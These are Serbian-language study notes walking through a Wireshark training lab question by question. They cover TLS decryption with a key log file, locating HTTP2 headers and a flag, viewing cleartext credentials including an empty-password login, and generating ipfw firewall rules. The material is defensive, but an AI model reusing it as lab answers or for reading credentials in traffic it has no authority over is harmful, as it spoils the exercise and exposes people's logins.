parovi kljuceva se kreiraju  po seseiji u vreme povezivanja tako da je vazno pisati kljuceve tokom snimanja saobracaja, u suprotnom nece biti moguce generisati datoteku.  

menjanje podesavanja je na: edit > preferences > protocols > tls i mozemo da dodamo ili uklonimo fajl sa kljucevima (premaster secret lof filename)   

- `http2`

kada ukucamo ovaj filter u zavisnosti (da li imamo log fajl sa kljucevima) on ce pokazati podatke ili nece pokazati ako nemamo fajl sa kljucevima  

prikaz podataka moze biti kao dektitovan ili kompresovan i na to treba obratiti paznju  

**koji je frame nuber za klijent hello poruke poslate na accounts.google.com**

primenim filter, pa pogledam u tls server name (mogu da nadjem kada kliknem na vrednost u sirovim bajtovima da ubrzam prikaz - kliknem na servername).  

nakon primene filtera trazim frame nuber, odnosno redni broj paketa koji ima trazeni server name, znaci rucno moram pregledati sve pakete, sva sreca pa je ovaj trazeni accounts.google drugi po redu  

filter pretrazuje zahteve poslate od klijenta ka serveru i moram oda izuzmemo mrezni protokol za otkrivanje mreznih usluga    

`(http.request or tls.handshake.type == 1) and !(ssdp)`

**desifruj saobracaj pomocu datog key log fajla. koji je broj http2 paketa**

edit > preferences > protocols > tls prvo odemo ovde u na browse ubacimo prilozen fajl  

nakon toga ukucamo https filter i izbrojimo koliko ima desifrovanih paketa

`http2`  

**idi na frame number 332. koje je zaglavlje autoriteta http2 paketa**

ostavimo primenjen filter i rucno navigiramo na frame numb 332  

`http2` 

onda idemo na detalje pa na http2 > stream > header:authority  ... kopiram ga sa copy > description i prosledim u odgovor kao defang  

**istraziti desifrovane pakete i pronaci flag**

u napomeni stoji da uradim export object. To i uradim... 

> podsetnik: file > export object > http i odaberem save (all), i sacuvam na desktop. Fajl .ico ne mogu da otvorim ali ovaj drugi otvorim uz pomoc vlm i odmah vidim flag  

# lov na kredencijale otvorenog teksta 

u ovom slucaju nije lako uociti da li je bruteforce ili je korisnik pogresno ukucao svoje akreditive (jer je predstavljeno na nivou paketa i kredencijale vidimo kao listu)  

wireshark ima opciju za pregled kredencijala: tools > credentials ova funkcija radi samo na verzijama wiresharka v3.1 +  

ova funkcija radi samo na odredjenim protkolima i ne treba potpuno oslanjati na nju da bi smo proverili plain text u saobracaju  

kada prikazemo listu kredencijala mozemo klikniuti na njih i videti detalje...  

**koji broj paketa u kredencijalima korsiti http basic auth** 

idmeo na tools > credentials i odmah tu kod http vidimo broj ukupnih paketa  

**koji je broj paketa koji je pokusao login sa praznom lozinkom**

ostanemo u prikazu kredencijala (tools > credentials za sve protokole) i tu klikcemo na broj paketa, a wireshark nas vodi na detalje  

tu vidimo detalje za svaki paket koji odaberemo. Za lozinku su request command: PASS, a request arg je vrednost. Mi trazimo onaj bez vrednosti.  

postoji drugo resenja da request command: PASS (iz detalja paketa) primenimo kao filter, i kada izvrsimo filter odmah ce nam se u tabeli pokazati prazno mesto za vrednost lozinke  

# rezultati (firewall pravila) 

wireshark moze da nam pomogne da kreiramo firewall pravila u nekoliko klikova. 

odemo na tools > firewall acl rules otvara se novi prozor koji nam daje kombinaciju pravila zasnovanih na ip, portu i mac-u.  

ova pravila se generisu za implementaiciju na spoljasnjem zidu firewalla 

trenutno wireshark moze da kreira pravila za: 

```
Netfilter (iptables)
Cisco IOS (standard/extended)
IP Filter (ipfilter)
IPFirewall (ipfw)
Packet filter (pf)
Windows Firewall (netsh new/old format)
```

**selektuj paket 99, napravi pravilo za ipfirewall (ipfw). koje je pravilo za odbijanje source ipv4 adrese**

odemo na tools > firewall acl rules odaberemo dole pravila za ipfirewall (ipfw), oznacimo inbound i deny i prekopiramo pravilo koje odbija ipv4 source adresu  

**selektuj paket 231, napravi pravilo za ipfirewall (ipfw). koje je pravilo za dozvoljavanje mac adrese odredista**

isto odemo na tools > firewall acl rules odaberemo dole isto ipfirewall i iskljucimo deny opciju i kopiramo pravilo koje odgovara za allow mac destination address  


